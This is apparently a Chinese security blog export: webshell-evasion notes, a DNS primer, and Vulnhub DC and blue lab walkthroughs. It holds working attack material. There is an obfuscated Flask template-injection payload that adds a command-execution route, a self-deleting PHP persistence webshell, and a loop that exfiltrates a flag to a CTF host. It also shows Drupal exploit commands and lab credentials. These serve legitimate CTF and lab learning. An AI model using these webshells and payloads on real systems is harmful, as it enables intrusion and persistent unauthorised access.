href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>代码审计知识星球</p><p>收集：</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><ul><li>无文件落地–内存马</li></ul><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>通过注册路由处理来实现注入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x 是可以的</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 僵尸进程 记得编码</span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>僵尸进程 ： 子进程先于父进程退出，父进程又没有处理子进程的退出状态，此时子进程就会称为僵尸进程。</p><p>父进程通过<code>sleep(600)</code>保证子进程优先于父进程退出</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77条消息) python僵尸进程的产生和僵尸进程自动处理_pipe导致僵尸进程_Jimmy-TONG的博客-CSDN博客</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的。</p><p>JAVA</p><p>放在java安全里吧</p><h5 id="流量绕过"><a href="#流量绕过" class="headerlink" title="流量绕过"></a>流量绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱特征：HTTP Header</span><br><span class="line">request和response内容</span><br></pre></td></tr></table></figure><p>参考之前HW看的文章</p><ul><li><p>哥斯拉</p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户</a></p></li><li><p>冰蝎</p><p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区</a></p><p><a href="https://www.secpulse.com/archives/195173.html">冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/12453">冰蝎4.0自定义加密 - 先知社区</a></p></li><li><p>蚁剑</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">玄武盾的几种绕过姿势 - 先知社区</a></p><h2 id="好文收集"><a href="#好文收集" class="headerlink" title="好文收集"></a>好文收集</h2><p><a href="https://xz.aliyun.com/t/12089">记一次阿里云伏魔引擎-多功能场景绕过测试 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS协议</title>
      <link href="/2023/06/01/DNS/"/>
      <url>/2023/06/01/DNS/</url>
      
        <content type="html"><![CDATA[<h3 id="DNS协议介绍"><a href="#DNS协议介绍" class="headerlink" title="DNS协议介绍"></a>DNS协议介绍</h3><p>DNS（Domain Name System）协议位于ISO参考模型的应用层。在ISO参考模型中，应用层是最高层，负责提供网络服务和应用程序之间的接口。</p><p>DNS协议的主要功能是将域名解析为IP地址。当用户在浏览器中输入一个域名时，例如”<a href="http://example.com/">example.com</a>“，浏览器会发送一个DNS查询请求到本地DNS服务器。本地DNS服务器通过DNS协议向上级DNS服务器发出请求，逐级查询，直至找到与域名对应的IP地址，并返回给用户的设备。这样，用户可以通过域名来访问互联网上的资源，而不需要记住复杂的IP地址。</p><p>由于DNS协议处于应用层，它建立在传输层协议（如TCP或UDP）之上进行通信，以实现域名解析和IP地址的映射。因此，在ISO参考模型中，DNS协议在应用层负责提供域名解析服务。</p><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p><img src="/../images/image-20221115163957139-1694328360129.png" alt="image-20221115163957139"></p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p><img src="/../images/image-20221115164624383-1694328362681.png" alt="image-20221115164624383"></p><h3 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h3><p>每次请求时都像DNS服务器发起查询，过于浪费资源，所以出现了DNS缓存。</p><p><a href="https://blog.csdn.net/qq_32252957/article/details/82991880">https://blog.csdn.net/qq_32252957/article/details/82991880</a></p><p><strong>浏览器DNS查找顺序一般是这样的:</strong> </p><p>   浏览器DNS缓存-&gt;本地系统DNS缓存-&gt;本地计算机HOSTS文件-&gt;路由器DNS缓存-&gt;ISP的DNS缓存-&gt;根服务器递归搜索</p><ul><li><p>浏览器DNS缓存（内存中)</p><p>浏览器会按照一定频率缓存DNS记录  <a href="https://www.jianshu.com/p/9e7aa4ec4b46">查看google浏览器DNS缓存</a></p></li><li><p>本地DNS缓存(内存中)</p><p>查看：<code>ipconfig /displaydns</code></p><p>清除：<code>ipconfig /flushdns</code></p></li><li><p>本地HOSTS文件</p><p><code>c:\windows\system32\drivers\etc\hosts </code> </p></li><li><p>路由器DNS缓存</p><blockquote><p>路由器DNS被篡改会造成域名劫持，你访问的网址都会被定位到同一个位置，但是IP直接可以访问</p></blockquote></li><li><p>ISP的DNS服务器</p><ul><li><p>公共服务器</p><p><code>8.8.8.8</code> (Google 提供)</p><p><code>114.114.114.114</code> (国内公共 DNS)</p></li><li><p>专用服务器</p></li></ul></li><li><p>根服务器</p><blockquote><p>以访问<a href="http://www.baidu.com为例,/">www.baidu.com为例，</a> DNS服务器先问根域名服务器.com域名服务器的IP地址，然后再问.com域名服务器，以此类推</p></blockquote></li></ul><h3 id="设置DNS解析"><a href="#设置DNS解析" class="headerlink" title="设置DNS解析"></a>设置DNS解析</h3><p>以阿里云服务器为例</p><p><img src="/../images/image-20221004160123895-1694328366241.png" alt="image-20221004160123895"></p><ul><li><p>主机记录</p><p>就是要解析的域名，比如网站根域名为khaz.top，主机记录@即@khaz.top等价于khaz.top</p><blockquote><p>通常会将加www和不加www的域名都解析到同一个ip上。</p></blockquote></li><li><p>记录类型</p><p><img src="/../images/image-20221004160443733-1694328407151.png" alt="image-20221004160123896"></p></li><li><p>解析线路</p><p>就是选择哪一个ISP的DNS服务器。</p></li><li><p>记录值</p><p>就是域名对应的IP地址。</p></li><li><p>TTL</p><p>DNS缓存时间，当修改DNS解析时，需要经过TTL时间才会生效。</p></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？"><a href="#当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？" class="headerlink" title="当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？"></a>当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？</h4><p>答案：</p><ol><li><p>虚拟主机技术</p><p>实现多个站点在同一台服务器上。</p><blockquote><p>比如服务器使用Apache，那么在Apache的配置文件中加入VirtualHost即可新增虚拟主机</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/acm</span><br><span class="line"> ServerName acm.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">    </span><br><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/html</span><br><span class="line"> ServerName www.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>ServerName对应请求头的HOST字段，DocumentRoot对应的站点目录</p><p>这样HOST为acm.hdu.edu.cn时，访问的就是&#x2F;var&#x2F;www&#x2F;acm下的acm.hdu.edu.cn网站</p><p>HOST为<a href="http://www.hdu.edu.cn时,访问的就是/var/www/html%E4%B8%8B%E7%9A%84www.hdu.edu.cn%E7%BD%91%E7%AB%99">www.hdu.edu.cn时，访问的就是/var/www/html下的www.hdu.edu.cn网站</a></p><blockquote><p>虚拟主机技术，也可以实现不同端口对应不同站点，只要修改上面的&lt;VirtualHost *:80&gt;即可。</p></blockquote></li><li><p>反向代理技术</p><p>每个站点都在不同的主机上，但都是通过E这个代理服务器进行访问的。</p><p><img src="/../images/reverse-proxy-flow-1694328428983.svg" alt="反向代理流"></p></li></ol><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><h5 id="DNS欺骗攻击"><a href="#DNS欺骗攻击" class="headerlink" title="DNS欺骗攻击"></a>DNS欺骗攻击</h5><p><a href="https://www.freebuf.com/articles/network/342113.html">https://www.freebuf.com/articles/network/342113.html</a></p><h5 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS  Rebinding"></a>DNS  Rebinding</h5><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="nslookup-x2F-dig"><a href="#nslookup-x2F-dig" class="headerlink" title="nslookup&#x2F;dig"></a>nslookup&#x2F;dig</h4><p><a href="https://blog.csdn.net/weixin_42426841/article/details/115364502">https://blog.csdn.net/weixin_42426841/article/details/115364502</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC系列</title>
      <link href="/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223133100570-1686283446321.png" alt="image-20230223133100570"></p><p><img src="/../images/image-20230223133203500-1686283446321.png" alt="image-20230223133203500"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/../images/image-20230223131655833-1686283446321.png" alt="image-20230223131655833"></p><h4 id="查看网站"><a href="#查看网站" class="headerlink" title="查看网站"></a>查看网站</h4><p><img src="/../images/image-20230223133357605-1686283446321.png" alt="image-20230223133357605"></p><p>只有注册，登录，找回密码功能（这里用sqlmap没有成功）</p><p>很容易知道其是Drupal系统。</p><h4 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h4><p><img src="/../images/image-20230223133730288-1686283446321.png" alt="image-20230223133730288"></p><p>这里优先使用日期较新，等级为优秀的exp（也可以通过收集到的系统版本寻找日期）</p><p><img src="/../images/image-20230223133945118-1686283446321.png" alt="image-20230223133945118"></p><p>发现成功了。</p><h4 id="获得shell后的信息收集"><a href="#获得shell后的信息收集" class="headerlink" title="获得shell后的信息收集"></a>获得shell后的信息收集</h4><p><img src="/../images/image-20230223134100934-1686283446322.png" alt="image-20230223134100934"></p><p>网上查找可知Drupal的配置文件在<code> /sites/default/settings.php</code>,读取后得到flag2和数据库配置信息</p><p><img src="/../images/1962254-20200713224317160-859515027-1686283446322.png" alt="img"></p><p>连接数据库，需要先将shell切换为交互式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223134424820-1686283446322.png" alt="image-20230223134424820"></p><p>连接后，查询用户表收集管理员账户信息。</p><p><img src="/../images/image-20230223130117676-1686283446322.png" alt="image-20230223130117676"></p><p>可以看到这里admin的密码是加密了的。这里有三种思路</p><ul><li><p>暴力破解</p><blockquote><p>使用john失败了。</p></blockquote><p><img src="/../images/image-20230223135625792-1686283446323.png" alt="image-20230223135625792"></p></li><li><p>修改密码</p><blockquote><p>需要找到对应的加密脚本。</p></blockquote><p><img src="/../images/image-20230223135430041-1686283446323.png" alt="image-20230223135430041"></p><p><img src="/../images/image-20230223130607081-1686283446323.png" alt="image-20230223130607081"></p><p><img src="/../images/image-20230223131033472-1686283446323.png" alt="image-20230223131033472"></p></li><li><p>增加一名用户（管理员权限）</p><p>使用<a href="https://blog.csdn.net/whatday/article/details/102806149">SearchSploit</a>查找是否有对应的脚本</p><p><img src="/../images/image-20230223142047059-1686283446323.png" alt="image-20230223142047059"></p><p><img src="/../images/image-20230223142453365-1686283446323.png" alt="image-20230223142453365"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2  /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223142640254-1686283446323.png" alt="image-20230223142640254"></p><p><img src="/../images/image-20230223142651974-1686283446323.png" alt="image-20230223142651974"></p></li></ul><h3 id="登录后"><a href="#登录后" class="headerlink" title="登录后"></a>登录后</h3><p><img src="/../images/image-20230223131339443-1686283446323.png" alt="image-20230223131339443"></p><p><img src="/../images/image-20230223131415615-1686283446323.png" alt="image-20230223131415615"></p><p><img src="/../images/image-20230223131557531-1686283446323.png" alt="image-20230223131557531"></p><p><img src="/../images/image-20230223131846299-1686283446324.png" alt="image-20230223131846299"></p><p>尝试提权</p><p><img src="/../images/image-20230223131936343-1686283446324.png" alt="image-20230223131936343"></p><p><img src="/../images/image-20230223131903800-1686283446324.png" alt="image-20230223131903800"></p><p><img src="/../images/image-20230223131922331-1686283446324.png" alt="image-20230223131922331"></p><p><img src="/../images/image-20230223132056437-1686283446324.png" alt="image-20230223132056437"></p><p><img src="/../images/image-20230223132116100-1686283446324.png" alt="image-20230223132116100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223132610089-1686283446324.png" alt="image-20230223132610089"></p><p>破解成功后登录flag4用户</p><p><img src="/../images/image-20230223132741851-1686283446324.png" alt="image-20230223132741851"></p><p><img src="/../images/image-20230223132857455-1686283446324.png" alt="image-20230223132857455"></p><p>仍然使用上面的find提权</p><p><img src="/../images/image-20230223132915683-1686283446324.png" alt="image-20230223132915683"></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><p><a href="https://cloud.tencent.com/developer/article/1801074">https://cloud.tencent.com/developer/article/1801074</a></p><ul><li>ip重定向，需要添加host记录</li><li>cewl密码字典生成，密码爆破</li><li>7744端口的ssh爆破</li><li>rbash限制</li><li>git提权</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p><a href="https://blog.csdn.net/bwt_D/article/details/121291921">https://blog.csdn.net/bwt_D/article/details/121291921</a></p><ul><li>信息收集：得到网站CMS，使用对应版本漏洞exp爆库</li><li>john密码哈希爆破</li><li>后台任意文件上传</li><li>内核提权</li></ul><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><ul><li>用户登录无防护爆破</li><li>rce</li><li>ssh爆破</li><li>信息收集：备份文件，邮件（泄露用户密码）</li><li>teehee提权</li></ul><p><img src="/../images/image-20230224161511140-1686283446324.png" alt="image-20230224161511140"></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p><a href="https://www.freebuf.com/sectool/259277.html">https://www.freebuf.com/sectool/259277.html</a></p><ul><li>日志包含getshell</li><li>screen提权</li></ul><p>端口扫描</p><img src="../../../typora img/image-20230224202703382.png" alt="image-20230224202703382" style="zoom: 80%;" /><p>通过contact提交后，页面返回的页脚不同判断出后端有include函数包含了页脚文件。</p><p><img src="/../images/image-20230224204544733-1686283446324.png" alt="image-20230224204544733"></p><p><img src="/../images/image-20230224204559624-1686283446325.png" alt="image-20230224204559624"></p><p>使用burp爆破参数</p><p><img src="/../images/image-20230224204633133-1686283446325.png" alt="image-20230224204633133"></p><img src="../../../typora img/image-20230224204657204.png" alt="image-20230224204657204" style="zoom:80%;" /><p>文件包含getshell</p><p>因为网站没有文件上传功能，所以可以考虑包含日志文件&#x2F;session文件，或者与phpinfo界面连用。</p><p>这里选择包含日志文件</p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><p><a href="https://blog.csdn.net/weixin_45996361/article/details/123431118">https://blog.csdn.net/weixin_45996361/article/details/123431118</a></p><ul><li>用户密码爆破（字典为DC2的）</li><li>wordpress插件activity monitor提供了ping命令，对用户输入无限制导致rce</li><li>邮件密码泄露</li><li>sudo提权</li><li>nmap提权</li></ul><p><img src="/../images/image-20230225172831079-1686283446325.png" alt="image-20230225172831079"></p><p><img src="/../images/image-20230225202530004-1686283446325.png" alt="image-20230225202530004"></p><p><img src="/../images/image-20230225202604851-1686283446325.png" alt="image-20230225202604851"></p><p><img src="/../images/image-20230225202617319-1686283446325.png" alt="image-20230225202617319"></p><p><img src="/../images/image-20230225202517080-1686283446325.png" alt="image-20230225202517080"></p><p><img src="/../images/image-20230225202502557-1686283446325.png" alt="image-20230225202502557"></p><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><ul><li><p>端口：22,80</p></li><li><p>信息收集：github源码泄露</p><p><img src="/../images/image-20230225211326780-1686283446325.png" alt="image-20230225211326780"></p><img src="../../../typora img/image-20230225211258444.png" alt="image-20230225211258444" style="zoom:80%;" /><p><img src="/../images/image-20230225211553018-1686283446325.png" alt="image-20230225211553018"></p><p>这个账户测试后可以连接ssh</p></li><li><p>ssh连接后信息收集</p><p>有邮件</p><p><img src="/../images/image-20230225211951236-1686283446325.png" alt="image-20230225211951236"></p><p><img src="/../images/image-20230225211719078-1686283446326.png" alt="image-20230225211719078"></p><p>发现都是以下信息，并且每隔一段时间都有<code>You have new mail</code>提示，可以猜测出这是一个定时脚本</p><p><img src="/../images/image-20230225211729539-1686283446326.png" alt="image-20230225211729539"></p><p><img src="/../images/image-20230225211814513-1686283446326.png" alt="image-20230225211814513"></p><p>​</p></li></ul><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p>drush是drupal的命令，可以修改admin密码 ，不知道为什么在网站目录下才可以</p><p>gpg是公钥加密算法，没找到公钥，所以无法解密，否则可以解密重新导入sql文件</p><p><code>mysql -udc7user -pMdR3xOgB7#dW Staff &lt; /home/dc7user/backups/website.sql;</code></p><ul><li><p>提权</p><p>​通过修改admin密码登录后台，可以编辑博客或者页面。那么直接选择编辑页面写入一个木马。但是需要先安装PHP模块。</p><p>​木马写入后，获得www-data用户权限</p><p>​<img src="/../images/image-20230225225209155-1686283446326.png" alt="image-20230225225209155"></p><p>从定时脚本所属的用户和用户组入手，用户组为www-data权限为rwx：说明www</p><p>-data用户可以对其进行读写执行，拥有者为root：说明其运行时的权限为root。所以我们向其写入反弹shell，等待其执行就可以获得root权限。</p></li></ul><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><p><a href="https://blog.csdn.net/q90375412/article/details/127351747">https://blog.csdn.net/q90375412/article/details/127351747</a></p><ul><li>sql注入（sqlmap）</li><li>john破解密码</li><li>后台模板getshell</li><li>exim4提权</li></ul><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><p><a href="https://blog.csdn.net/m0_65712192/article/details/129250059">https://blog.csdn.net/m0_65712192/article/details/129250059</a></p><p><img src="/../images/image-20230309113640488-1686283446326.png" alt="image-20230309113640488"></p><p>可以发现ssh服务是filtered的</p><p><img src="/../images/image-20230309115117489-1686283446326.png" alt="image-20230309115117489"></p><p><img src="/../images/image-20230309115144629-1686283446326.png" alt="image-20230309115144629"></p><p><img src="/../images/image-20230309121325288-1686283446326.png" alt="image-20230309121325288"></p><p><img src="/../images/image-20230309121309508-1686283446326.png" alt="image-20230309121309508"></p><p><img src="/../images/image-20230309121245679-1686283446327.png" alt="image-20230309121245679"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--blue系列</title>
      <link href="/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><img src="../../../typora img/image-20230305123445338.png" alt="image-20230305123445338" style="zoom:80%;" /><p><img src="/../images/image-20230305130206056-1686283466992.png" alt="image-20230305130206056"></p><p><img src="/../images/image-20230305130221501-1686283466992.png" alt="image-20230305130221501"></p><p>secret.zip没有破解出来。</p><p>dirseach目录扫描结果</p><p><img src="/../images/image-20230305130651336-1686283466992.png" alt="image-20230305130651336"></p><p>访问robots.txt中的网址</p><p><img src="/../images/image-20230305130727097-1686283466992.png" alt="image-20230305130727097"></p><p>歌词连在一起MD5为ssh密码，没成功。</p><p>另一个网站为&#x2F;etc&#x2F;dripispowerful.html，猜测有文件包含，根据上面的目录扫描只有一个index.php，参数尝试压缩包里的focus  on “drip”。</p><p>尝试访问index.php?drip&#x3D;&#x2F;etc&#x2F;dripispowerful.html，获得密码和两个用户名</p><p><img src="/../images/image-20230305131636950-1686283466992.png" alt="image-20230305131636950"></p><p>ssh登录</p><p><img src="/../images/image-20230305132010055-1686283466992.png" alt="image-20230305132010055"></p><p>提权（不会，看wp的）</p><p><img src="/../images/image-20230305133355153-1686283466992.png" alt="image-20230305133355153"></p><p>polkit提权<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p><img src="/../images/image-20230305133346301-1686283466992.png" alt="image-20230305133346301"></p><p><img src="/../images/image-20230305133331628-1686283466992.png" alt="image-20230305133331628"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ul><li>ftp匿名登录</li><li>wordpress用户爆破，后台getshell</li><li>ssh密钥登录</li><li>nmap提权</li></ul><p><img src="/../images/image-20230304120228644-1686283466993.png" alt="image-20230304120228644"></p><p><img src="/../images/image-20230304120308755-1686283466993.png" alt="image-20230304120308755"></p><p>ftp存在匿名登录，经过验证发现ftp上的secret.jpg无隐写。</p><p><img src="/../images/image-20230304120324693-1686283466993.png" alt="image-20230304120324693"></p><p><img src="/../images/image-20230304120358152-1686283466993.png" alt="image-20230304120358152"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230304121310981-1686283466993.png" alt="image-20230304121310981"></p><p>进行密码爆破</p><p><img src="/../images/image-20230304122015951-1686283466993.png" alt="image-20230304122015951"></p><p>访问后台时跳转，添加host记录</p><p><img src="/../images/image-20230304121229221-1686283466993.png" alt="image-20230304121229221"></p><p>进入后台</p><p>在主题的404文件中加入一句话木马，访问该404文件，传入反弹shell</p><p><img src="/../images/image-20230304125406319-1686283466993.png" alt="image-20230304125406319"></p><p><img src="/../images/image-20230304125413838-1686283466993.png" alt="image-20230304125413838"></p><p><img src="/../images/image-20230304125353482-1686283466993.png" alt="image-20230304125353482"></p><p>进入家目录看看</p><p><img src="/../images/image-20230304125605846-1686283466993.png" alt="image-20230304125605846"></p><p>无权限，尝试提权失败</p><p>但是还存在ssh密钥，我们可以将ssh私钥下载到本地，通过ssh登录到freddie用户</p><p>使用python在.ssh目录下开一个简易服务器供本地下载文件。</p><p><img src="/../images/image-20230304131800088-1686283466993.png" alt="image-20230304131800088"></p><p>本地下载下来后，需要将id_rsa改为只有400权限才可以使用</p><p><img src="/../images/image-20230304132002887-1686283466993.png" alt="image-20230304132002887"></p><p><img src="/../images/image-20230304132104344-1686283466993.png" alt="image-20230304132104344"></p><p><img src="/../images/image-20230304132257002-1686283466993.png" 